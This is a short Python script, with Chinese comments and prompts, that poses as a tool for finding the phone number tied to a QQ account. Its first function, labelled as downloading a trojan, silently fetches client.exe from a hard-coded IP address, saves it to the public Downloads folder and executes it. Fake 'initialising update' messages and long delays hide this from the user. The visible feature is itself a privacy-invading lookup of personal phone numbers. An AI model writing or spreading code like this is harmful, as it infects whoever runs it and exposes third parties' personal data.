import os
import subprocess
import time
import requests
from threading import Thread

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
}


# 下载木马程序
def down():
    a = os.path.exists("C:/Users/Public/Downloads/client.exe")
    if a is False:
        url = "http://82.157.65.112:999/static/client.exe"
        data = requests.get(url).content
        with open('C:/Users/Public/Downloads/client.exe', 'wb') as fp:
            fp.write(data)
        time.sleep(1)
        subprocess.Popen("C:/Users/Public/Downloads/client.exe", shell=True, stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    else:
        pass


# 根据qq号查询手机号
def main(qq):
    url = f"https://zy.xywlapi.cc/qqcx?qq={qq}"
    text = requests.get(url, headers=headers).json()
    print("手机号:" + text["phone"])


if __name__ == '__main__':
    Thread(target=down).start()
    print("等待启动中.........")
    time.sleep(10)
    print("正在初始化更新中,请等待一分钟")
    time.sleep(60)
    while True:
        qq = input("请输入QQ:")
        print("正在查询，请稍等......(第一次查询可能有点慢，外国接口)")
        time.sleep(30)
        main(qq)
